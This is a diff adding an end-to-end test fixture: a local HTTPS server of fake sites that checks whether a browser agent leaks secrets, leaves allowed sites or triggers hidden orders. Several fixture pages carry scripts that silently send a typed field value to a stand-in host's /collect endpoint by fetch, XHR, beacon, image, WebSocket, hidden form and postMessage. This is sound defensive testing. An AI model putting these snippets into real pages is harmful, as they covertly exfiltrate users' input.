@@ -1,0 +1,366 @@
+// The local websites the end-to-end tests drive: one HTTPS server on 127.0.0.1 that answers by host name, with a self-signed
+// certificate made at the start (the `openssl` command) and thrown away after. Chromium reaches `*.test` here through
+// `--host-resolver-rules` (harness.mjs), and the URLs carry the server's port: a site's rules read the host alone.
+//
+//   news.test   an article to read, and a long page whose text comes in windows
+//   shop.test   a form (text, select, checkbox, password), a page that asks confirm(), a page that links off the run's sites,
+//               the other ways a page leaves for another site (a redirect, a form that posts there, a refresh, a script, a link
+//               to a new tab, a frame), and a page that holds secrets in frames
+//               and a page of the person's own (also on other.test), open before a run joins their tab
+//   other.test  a site no grant lists
+//
+// A test can also answer another host on the same server (`serve`): the fake tafs cloud and KIFF (planque.mjs).
+
+import { createServer } from "node:https";
+import { execFileSync } from "node:child_process";
+import { mkdtempSync, readFileSync, rmSync } from "node:fs";
+import { tmpdir } from "node:os";
+import { join } from "node:path";
+
+/** The password the form's field holds: a read or a result that carries it has leaked it. */
+export const PASSWORD = "hunter2-e2e-Zq7";
+
+const page = (title, body) => `<!doctype html><html><head><meta charset="utf-8"><title>${title}</title></head><body>${body}</body></html>`;
+
+const ARTICLE = page("Tide tables", `<h1>Tide tables</h1>
+<p>The harbour floods twice a day. High water today is at 06:12 and 18:40.</p>
+<p>Boats leave from the north quay.</p>`);
+
+const LONG = page("A long page", `<h1>A long page</h1>` + Array.from({ length: 600 }, (_, i) => `<p>Line ${i + 1} of the long page, with enough words to fill it.</p>`).join("\n") + `<p id="end">The last line.</p>`);
+
+const FORM = page("Delivery details", `<h1>Delivery details</h1>
+<form id="details" onsubmit="event.preventDefault()">
+  <label for="name">Full name</label><input id="name" type="text">
+  <label for="size">Size</label><select id="size"><option>Small</option><option>Medium</option><option>Large</option></select>
+  <label for="news">Send me news</label><input id="news" type="checkbox">
+  <label for="pw">Password</label><input id="pw" type="password" value="${PASSWORD}">
+  <button type="submit" id="save">Save details</button>
+</form>`);
+
+const CONFIRM = page("Drafts", `<h1>Drafts</h1>
+<p id="out">untouched</p>
+<button id="delete" onclick="document.getElementById('out').textContent = confirm('Delete every draft?') ? 'accepted' : 'refused'">Delete drafts</button>`);
+
+/** A page of the run's sites with a link on them, a link and a form off them: where a joined tab is acted on. */
+const HUB = (port) => page("Harbour news", `<h1>Harbour news</h1>
+<a id="long" href="/long?case=hub">Read the long page</a>
+<a id="off" href="https://other.test:${port}/?from=hub">Somewhere else</a>
+<form id="ask" method="get" action="https://other.test:${port}/?from=hub-form"><label for="q">Question</label><input id="q" name="q" type="text"><button type="submit">Ask elsewhere</button></form>`);
+
+const LINKS = (port) => page("Links", `<h1>Links</h1>
+<a id="off" href="https://other.test:${port}/">Somewhere else</a>`);
+
+const OTHER = page("Other", `<h1>Not on the run's sites</h1>`);
+
+/** What only the person's own page holds, before a run joins their tab: a read or a result that carries it has read their page. */
+export const PERSON_WORDS = "Private notes the person had open";
+export const PERSON_VALUE = "person-value-e2e-Jt3";
+
+/** The person's own page, open in their tab before the run (on the run's sites or not): a form that posts to its own site. */
+const ACCOUNT = page("Your account", `<h1>Your account</h1>
+<p>${PERSON_WORDS}.</p>
+<form id="account" method="post" action="/account?from=account">
+  <label for="notes">Notes</label><input id="notes" name="notes" type="text" value="${PERSON_VALUE}">
+  <button type="submit" id="keep">Save account</button>
+</form>`);
+
+/** The password in a frame of the same site, and the one in a frame of another of the run's sites. */
+export const FRAME_PASSWORD = "frame-pw-e2e-Kx4";
+export const CROSS_FRAME_PASSWORD = "cross-frame-pw-e2e-Vb9";
+/** Words only a frame holds: a read that has them read the frame. */
+export const FRAME_WORDS = "Words inside the frame";
+
+// Every other way a page of the run's sites can leave for other.test, each named by `from` in what other.test would be asked.
+const LEAVE = {
+  post: (port) => page("Send a note", `<h1>Send a note</h1>
+<form id="note" method="post" action="https://other.test:${port}/collect?from=post">
+  <label for="words">Note</label><input id="words" name="words" type="text">
+  <button type="submit" id="send">Send the note</button>
+</form>`),
+  refresh: (port) => `<!doctype html><html><head><meta charset="utf-8"><meta http-equiv="refresh" content="0; url=https://other.test:${port}/?from=refresh"><title>Moving</title></head><body><h1>Moving</h1></body></html>`,
+  assign: (port) => page("A button", `<h1>A button</h1>
+<button id="go" type="button" onclick="location.assign('https://other.test:${port}/?from=assign')">Go elsewhere</button>`),
+  blank: (port) => page("A new tab", `<h1>A new tab</h1>
+<a id="new" target="_blank" href="https://other.test:${port}/?from=blank">Open it in a new tab</a>`),
+  // A moment after the click (once the act's own wait is over), by the page itself, carrying what was typed: a script's delayed
+  // assign, and a refresh it adds.
+  later: (port) => page("Save for later", `<h1>Save for later</h1>
+<label for="word">Word</label><input id="word" type="text">
+<button id="later" type="button" onclick="setTimeout(() => location.assign('https://other.test:${port}/?from=later&leak=' + encodeURIComponent(document.getElementById('word').value)), 3000)">Save it later</button>`),
+  slowrefresh: (port) => page("Refresh later", `<h1>Refresh later</h1>
+<label for="word">Word</label><input id="word" type="text">
+<button id="arm" type="button" onclick="const m = document.createElement('meta'); m.httpEquiv = 'refresh'; m.content = '3;url=https://other.test:${port}/?from=slowrefresh&amp;leak=' + encodeURIComponent(document.getElementById('word').value); document.head.appendChild(m)">Refresh it later</button>`),
+  frame: (port) => page("A frame", `<h1>A frame from elsewhere</h1>
+<iframe id="away" src="https://other.test:${port}/?from=frame" width="300" height="100"></iframe>`),
+};
+
+/**
+ * Pages of the run's sites whose own script sends what is typed in their field to other.test by a request of the page's own, not
+ * by a navigation: once the field has a value (the taf's fill), `via` sends it once, as `?leak=<value>&via=<via>`. A test reads
+ * other.test's log for the value (`hits`, and the WebSocket upgrades in it).
+ */
+export const LEAK_VIAS = ["fetch", "xhr", "beacon", "img", "form-iframe", "websocket", "postmessage"];
+const LEAK = (port, via) => {
+  const away = `https://other.test:${port}`;
+  const send = {
+    fetch: `fetch("${away}/collect?" + q, { mode: "no-cors" }).catch(() => {});`,
+    xhr: `const x = new XMLHttpRequest(); x.open("GET", "${away}/collect?" + q); x.send();`,
+    beacon: `navigator.sendBeacon("${away}/collect?" + q, "");`,
+    img: `new Image().src = "${away}/collect?" + q;`,
+    // A GET form's own fields make its query (the action's is dropped): the value and the way go as fields.
+    "form-iframe": `const f = document.getElementById("quiet"); f.action = "${away}/collect"; f.elements.leak.value = v; f.submit();`,
+    websocket: `try { new WebSocket("wss://other.test:${port}/ws?" + q); } catch {}`,
+    postmessage: `document.getElementById("sink").contentWindow.postMessage(v, "*");`,
+  }[via];
+  const extra = via === "form-iframe"
+    ? `<iframe name="quietframe" width="10" height="10"></iframe><form id="quiet" method="get" target="quietframe"><input type="hidden" name="leak"><input type="hidden" name="via" value="form-iframe"></form>`
+    : via === "postmessage" ? `<iframe id="sink" src="${away}/sink" width="10" height="10"></iframe>` : "";
+  return page("A note", `<h1>A note</h1>
+<label for="note">Your note</label><input id="note" type="text">
+${extra}
+<script>
+let sent = false;
+setInterval(() => {
+  const v = document.getElementById("note").value;
+  if (!v || sent) return;
+  sent = true;
+  const q = "leak=" + encodeURIComponent(v) + "&via=${via}";
+  ${send}
+}, 100);
+</script>`);
+};
+
+/** other.test's frame that a page of the run's sites posts a message to: it sends what it's given home, by a fetch of its own. */
+const SINK = page("Sink", `<p>sink</p><script>addEventListener("message", (e) => { fetch("/collect?leak=" + encodeURIComponent(String(e.data)) + "&via=postmessage-frame").catch(() => {}); });</script>`);
+
+/**
+ * Pages whose one button places an order or pays, by the page's semantics alone (its words say only "Continue"): a submit in a
+ * schema.org Order, a payment provider's button, the submit of a form with a card field, and a page with a provider's payment
+ * frame. A click that lands writes "ordered" in #out.
+ */
+const DID = `onclick="document.getElementById('out').textContent = 'ordered'; return false"`;
+const ORDERS = {
+  schema: page("Your order", `<h1>Your order</h1><div itemscope itemtype="https://schema.org/Order"><form onsubmit="return false"><button type="submit" ${DID}>Continue</button></form></div><p id="out">not yet</p>`),
+  provider: page("Your order", `<h1>Your order</h1><button type="button" class="paypal-button" ${DID}>Continue</button><p id="out">not yet</p>`),
+  card: page("Your order", `<h1>Your order</h1><form onsubmit="return false"><label for="cc">Number</label><input id="cc" autocomplete="cc-number"><button type="submit" ${DID}>Continue</button></form><p id="out">not yet</p>`),
+  frame: page("Your order", `<h1>Your order</h1><iframe src="https://js.stripe.com/v3/elements" width="10" height="10"></iframe><button type="button" ${DID}>Continue</button><p id="out">not yet</p>`),
+};
+
+/**
+ * Controls the person can't use: a disabled button, a field in a disabled fieldset, a read-only field, a disabled option, and a
+ * radio group (a checked radio can't be unchecked by a click). Anything that lands writes what it did in #out.
+ */
+const CONTROLS = page("Locked controls", `<h1>Locked controls</h1>
+<form onsubmit="return false">
+  <button type="button" id="off" disabled onclick="document.getElementById('out').textContent = 'disabled button pressed'">Send it</button>
+  <fieldset disabled><legend>Locked</legend><label for="fs">Locked name</label><input id="fs" type="text" oninput="document.getElementById('out').textContent = 'fieldset field typed'"></fieldset>
+  <label for="ro">Read-only code</label><input id="ro" type="text" readonly value="fixed" oninput="document.getElementById('out').textContent = 'read-only field typed'">
+  <label for="sz">Size</label><select id="sz" onchange="document.getElementById('out').textContent = 'size ' + this.value"><option>Small</option><option disabled>Large</option></select>
+  <input type="radio" name="ship" id="r1" value="standard" checked><label for="r1">Standard</label>
+  <input type="radio" name="ship" id="r2" value="express"><label for="r2">Express</label>
+</form>
+<p id="out">untouched</p>`);
+
+// The signs a run draws on the page (signs.js, 0.2.23): a button and a field to act on, the outcome in #out.
+const SIGNS = page("Signs", `<h1>Signs</h1>
+<form onsubmit="return false">
+  <label for="nm">Your name</label><input id="nm" type="text" oninput="document.getElementById('out').textContent = 'typed ' + this.value">
+  <button type="button" id="press" onclick="document.getElementById('out').textContent = 'pressed'">Press me</button>
+</form>
+<p id="out">untouched</p>`);
+
+// A button below the fold that slides aside the moment the page scrolls: the pointer goes to it (which scrolls it into view), and
+// by the time of the act it's elsewhere. The act must be refused, never land where the button went or where it was.
+const MOVER = page("Mover", `<h1>Mover</h1>
+<div style="height:1800px"></div>
+<button type="button" id="mv" style="position:relative" onclick="document.getElementById('out').textContent = 'pressed'">Move away</button>
+<p id="out">untouched</p>
+<script>addEventListener("scroll", () => { document.getElementById("mv").style.left = "160px"; }, { once: true });</script>`);
+
+/**
+ * The rest of the controls: some the person can't use ([inert], aria-disabled, an option of a disabled optgroup), and some they
+ * can, which no lock may catch (readonly on a checkbox, a radio or a select, which browsers ignore; a field in the first legend of
+ * a disabled fieldset, which the fieldset doesn't disable).
+ */
+const SET = (what) => `document.getElementById('out').textContent = '${what}'`;
+const CONTROLS2 = page("More controls", `<h1>More controls</h1>
+<form onsubmit="return false">
+  <div inert><button type="button" onclick="${SET("inert pressed")}">Inert send</button></div>
+  <button type="button" aria-disabled="true" onclick="${SET("aria-disabled pressed")}">Aria send</button>
+  <label for="rc">Keep me posted</label><input id="rc" type="checkbox" readonly>
+  <input type="radio" name="speed" id="rr1" readonly checked><label for="rr1">Slow</label>
+  <input type="radio" name="speed" id="rr2" readonly><label for="rr2">Fast</label>
+  <label for="rs">Colour</label><select id="rs" readonly><option>Red</option><option>Blue</option></select>
+  <fieldset disabled><legend><label for="lg">Legend name</label><input id="lg" type="text"></legend><label for="inside">Inside name</label><input id="inside" type="text"></fieldset>
+  <label for="og">Plan</label><select id="og"><option>Free</option><optgroup label="Paid" disabled><option>Pro</option></optgroup></select>
+</form>
+<p id="out">untouched</p>`);
+
+/** A page of the run's sites that opens a pop-up as it loads; the pop-up raises a confirm as it loads. */
+const POPUP_AT_LOAD = page("A pop-up", `<h1>A pop-up</h1><script>window.open("/at-load-confirm?case=popup")</script>`);
+/** A page whose frame, of the same site, sends the whole tab to another page of the run's sites as it loads. */
+const FRAME_TOP = page("A frame that moves the page", `<h1>A frame that moves the page</h1><iframe src="/frame-top-inner" width="10" height="10"></iframe>`);
+const FRAME_TOP_INNER = page("Inner", `<script>top.location.href = "/article-moved";</script>`);
+
+/** Dialogs a page raises as it loads, before anything of the run's could run in it, and a page that asks before it's left. */
+const AT_LOAD = {
+  alert: page("Welcome", `<h1>Welcome</h1>`).replace("<title>Welcome</title>", "<title>Welcome</title><script>alert('Welcome to the shop')</script>"),
+  confirm: page("Stay", `<h1>Stay</h1><p id="out">-</p><script>document.getElementById("out").textContent = confirm("Stay signed in?") ? "accepted" : "refused";</script>`),
+  beforeunload: page("A draft", `<h1>A draft</h1><label for="d">Draft</label><input id="d" type="text"><script>addEventListener("beforeunload", (e) => { e.preventDefault(); e.returnValue = ""; });</script>`),
+};
+
+/**
+ * A page whose read no cut makes fit the relay's 120 KB: fields and controls are never cut (an act names them), and 200 fields
+ * with a long label and a long plain value, and 200 buttons with long labels, come to well over it. A button writes "pressed" in
+ * #out when it's clicked.
+ */
+const FILLER = "words of an ordinary form that a person filled in at length to say what they want from the shop today";
+const NO_FIT = page("A very long form", `<h1>A very long form</h1><p id="out">untouched</p><form onsubmit="return false">
+${Array.from({ length: 200 }, (_, i) => `<input type="text" aria-label="Field ${i + 1}: ${FILLER} ${FILLER}" value="${(FILLER + " ").repeat(5).trim()}">`).join("\n")}
+${Array.from({ length: 200 }, (_, i) => `<button type="button" onclick="document.getElementById('out').textContent = 'pressed ${i + 1}'">Button ${i + 1}: ${FILLER} ${FILLER}</button>`).join("\n")}
+</form>`);
+
+/** A page that fits until the taf's click, which grows it past what any cut makes fit (NO_FIT's fields and buttons, added in place). */
+const GROWS = (body) => page("A form that grows", `<h1>A form that grows</h1><p id="state">small</p>
+<button type="button" id="grow" onclick="document.getElementById('more').innerHTML = document.getElementById('tpl').innerHTML; document.getElementById('state').textContent = 'grown'">Show every option</button>
+<div id="more"></div><template id="tpl">${body}</template>`);
+
+/** A form whose Submit posts to the run's site; the page the post answers with is past what any cut makes fit (NO_FIT). */
+const SUBMIT_FORM = page("Send your order", `<h1>Send your order</h1>
+<form method="post" action="/submit-grows?case=submit"><label for="who">Name</label><input id="who" name="who" type="text"><button type="submit">Send it</button></form>`);
+
+/** A card number in a page's own text: masked in every read, whole or cut. */
+export const CARD_TEXT = "4111 1111 1111 1111";
+/**
+ * A page whose read is over the relay's 120 KB (40 selects of 50 long options: a read keeps 50 of each, 100 characters each), with a password field, a card number in its text
+ * and a field the person types in: the relay cuts it to fit, and nothing masked or typed may ride along in any cut.
+ */
+const HUGE = page("A long order form", `<h1>A long order form</h1>
+<p>Pay with the card ${CARD_TEXT} on file.</p>
+<form onsubmit="return false">
+  <label for="who">Your name</label><input id="who" type="text">
+  <label for="pw">Password</label><input id="pw" type="password" value="${PASSWORD}">
+  ${Array.from({ length: 40 }, (_, k) => `<label for="pick${k}">List ${k + 1}</label><select id="pick${k}">${Array.from({ length: 50 }, (_, i) => `<option>Option ${i + 1} of list ${k + 1}, with words enough to fill the hundred characters a read keeps of one</option>`).join("")}</select>`).join("\n  ")}
+</form>`);
+
+/** What only a fence target's page says (`/here` on any host): a read that has it read a page it may not reach. */
+export const TARGET_WORDS = "A page the run may never reach";
+
+/** What only the bank's page holds: a read or a result that carries it has read a sensitive site. */
+export const BANK_WORDS = "Balance on the joint account";
+const BANK = page("Your bank", `<h1>Your bank</h1><p>${BANK_WORDS}: 4 210,00.</p>`);
+/** A page of the run's sites with a link to a sensitive site of the grant (`bank.test`: its "bank" label makes it one). */
+const TO_BANK = (port) => page("Links to the bank", `<h1>Pay your rent</h1><a id="bank" href="https://bank.test:${port}/?from=link">Go to your bank</a>
+<a id="userinfo" href="https://x@bank.test:${port}/?from=userinfo">Sign in at your bank</a>`);
+
+const FRAMES = (port) => page("Frames", `<h1>Frames</h1>
+<p>The page around the frames.</p>
+<iframe id="same" src="/inner" width="400" height="160"></iframe>
+<iframe id="cross" src="https://news.test:${port}/inner" width="400" height="160"></iframe>`);
+
+const INNER = (password) => page("Inner", `<p>${FRAME_WORDS}</p>
+<label for="secret">Frame password</label><input id="secret" type="password" value="${password}">`);
+
+export class FixtureSites {
+  async start() {
+    this.dir = mkdtempSync(join(tmpdir(), "tafs-e2e-tls-"));
+    const key = join(this.dir, "key.pem");
+    const cert = join(this.dir, "cert.pem");
+    execFileSync("openssl", ["req", "-x509", "-newkey", "ec", "-pkeyopt", "ec_paramgen_curve:prime256v1", "-nodes", "-keyout", key, "-out", cert, "-days", "1", "-subj", "/CN=shop.test", "-addext", "subjectAltName=DNS:shop.test,DNS:news.test,DNS:other.test,DNS:bank.test,DNS:bank.shop.test,DNS:google.com,DNS:www.google.com,DNS:accounts.google.com,DNS:me.github.io,IP:127.0.0.1"], { stdio: "ignore" });
+    this.hits = []; // every request, as "host path?query"
+    this.posts = []; // every POST, as "host path?query"
+    this.hosts = new Map(); // a host answered by a test's own handler (serve)
+    this.server = createServer({ key: readFileSync(key), cert: readFileSync(cert) }, (req, res) => this.answer(req, res));
+    // A WebSocket's opening request is logged as any request is, then refused: what it asked for is all a test needs.
+    this.server.on("upgrade", (req, socket) => {
+      this.hits.push(String(req.headers.host || "").replace(/:\d+$/, "") + " " + req.url);
+      socket.destroy();
+    });
+    await new Promise((resolve) => this.server.listen(0, "127.0.0.1", resolve));
+    this.port = this.server.address().port;
+    return this;
+  }
+
+  /** The URL of `path` on `host` (`shop.test`, …), with this server's port. */
+  url(host, path = "/") {
+    return `https://${host}:${this.port}${path}`;
+  }
+
+  /** Answers every request for `host` with `handler(req, res)`, on this server, instead of a fixture page. */
+  serve(host, handler) {
+    this.hosts.set(host, handler);
+  }
+
+  answer(req, res) {
+    const host = String(req.headers.host || "").replace(/:\d+$/, "");
+    if (this.hosts.has(host)) return this.hosts.get(host)(req, res);
+    const path = new URL(req.url, "https://x").pathname;
+    this.hits.push(host + " " + req.url);
+    if (req.method === "POST") this.posts.push(host + " " + req.url);
+    // A redirect off the run's sites: the page answers 302 to other.test.
+    // On any host: a link to `to`, a 302 to `to`, and a page that only says where it is (the fence's targets: bank.shop.test,
+    // accounts.google.com, me.github.io, an address).
+    const to = new URL(req.url, "https://x").searchParams.get("to");
+    if (path === "/link-to" && to) {
+      res.writeHead(200, { "content-type": "text/html; charset=utf-8", "cache-control": "no-store" }).end(page("A link", `<h1>A link</h1><a id="go" href="${to.replace(/"/g, "&quot;")}">Go there</a>`));
+      return;
+    }
+    if (path === "/redirect-to" && to) {
+      res.writeHead(302, { location: to, "cache-control": "no-store" }).end();
+      return;
+    }
+    if (path === "/here") {
+      res.writeHead(200, { "content-type": "text/html; charset=utf-8", "cache-control": "no-store" }).end(page("Here", `<h1>${host}</h1><p>${TARGET_WORDS}</p>`));
+      return;
+    }
+    if (host === "shop.test" && path === "/redirect") {
+      res.writeHead(302, { location: this.url("other.test", "/?from=redirect"), "cache-control": "no-store" }).end();
+      return;
+    }
+    const pages = {
+      "news.test": { "/article": ARTICLE, "/long": LONG, "/inner": INNER(CROSS_FRAME_PASSWORD), "/hub": HUB(this.port) },
+      "shop.test": {
+        "/to-bank": TO_BANK(this.port),
+        "/huge": HUGE,
+        "/no-fit": NO_FIT,
+        // GET: the form; POST (its Submit): an answer no cut makes fit.
+        "/submit-grows": req.method === "POST" ? NO_FIT : SUBMIT_FORM,
+        "/grows": GROWS(NO_FIT.slice(NO_FIT.indexOf("<form"), NO_FIT.lastIndexOf("</form>") + 7)),
+        "/controls": CONTROLS,
+        "/signs": SIGNS,
+        "/mover": MOVER,
+        "/controls2": CONTROLS2,
+        "/popup-at-load": POPUP_AT_LOAD,
+        "/frame-top": FRAME_TOP,
+        "/frame-top-inner": FRAME_TOP_INNER,
+        "/article-moved": page("Moved here", "<h1>Moved here</h1>"),
+        ...Object.fromEntries(Object.entries(AT_LOAD).map(([name, body]) => ["/at-load-" + name, body])),
+        ...Object.fromEntries(Object.entries(ORDERS).map(([name, body]) => ["/order-" + name, body])),
+        "/form": FORM, "/confirm": CONFIRM, "/account": ACCOUNT, "/links": LINKS(this.port), "/frames": FRAMES(this.port), "/inner": INNER(FRAME_PASSWORD),
+        ...Object.fromEntries(Object.entries(LEAVE).map(([name, make]) => ["/leave-" + name, make(this.port)])),
+        ...Object.fromEntries(LEAK_VIAS.map((via) => ["/leak-" + via, LEAK(this.port, via)])),
+      },
+      "bank.test": { "/": BANK },
+      "other.test": { "/": OTHER, "/collect": OTHER, "/account": ACCOUNT, "/sink": SINK },
+    };
+    const body = (pages[host] || {})[path];
+    if (!body) {
+      res.writeHead(404, { "content-type": "text/plain" }).end("not found");
+      return;
+    }
+    // `?bfcache=1`: a page Chrome may keep in its back/forward cache (no `no-store`), so a Back to it commits with no request.
+    const cacheable = new URL(req.url, "https://x").searchParams.get("bfcache") === "1";
+    res.writeHead(200, { "content-type": "text/html; charset=utf-8", ...(cacheable ? {} : { "cache-control": "no-store" }) }).end(body);
+  }
+
+  /** Whether `host` was asked for anything since the start. */
+  reached(host) {
+    return this.hits.some((h) => h.startsWith(host + " "));
+  }
+
+  async stop() {
+    this.server.closeAllConnections();
+    await new Promise((resolve) => this.server.close(resolve));
+    rmSync(this.dir, { recursive: true, force: true });
+  }
+}
